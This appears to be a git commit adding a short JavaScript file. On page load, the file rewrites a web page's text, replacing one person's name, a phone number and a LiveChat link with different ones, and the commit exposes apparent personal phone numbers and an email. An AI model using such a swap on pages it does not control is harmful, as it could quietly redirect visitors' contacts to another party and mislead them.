59e568513748dcfc519645869ed6cd88b01e93a5
inggarfi <inggarsaput@gmail.com>
2025-06-10 10:45:30 +0700

    Create amib2.js

---
+++ amib2.js
@@ -0,0 +1,6 @@
+document.addEventListener("DOMContentLoaded", function () {
+    document.body.innerHTML = document.body.innerHTML
+        .replace(/MULYANAH/g, 'Surwati')
+        .replace(/089630677982/g, '088214538915')
+        .replace(/https:\/\/direct\.lc\.chat\/19183916\//g, 'https://direct.lc.chat/19188360/');
+});
